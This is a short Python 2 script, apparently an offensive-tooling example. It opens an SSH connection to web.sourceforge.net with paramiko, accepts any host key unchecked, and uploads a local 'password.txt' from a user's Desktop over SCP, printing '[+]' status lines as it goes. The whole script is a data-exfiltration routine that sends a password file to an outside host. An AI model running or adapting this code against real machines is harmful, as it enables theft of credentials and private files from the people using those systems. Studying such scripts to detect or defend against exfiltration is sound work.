import paramiko
import scp

ssh_client = paramiko.SSHClient()
ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh_client.connect("web.sourceforge.net", username="", password="")
print '[+] Authenticating against web.sourceforge.net...'

scp = scp.SCPClient(ssh_client.get_transport())
scp.put('C:\Users\user\Desktop\password.txt')
print '[+] File is uploaded'
scp.close()
print '[+] Closing the socket'
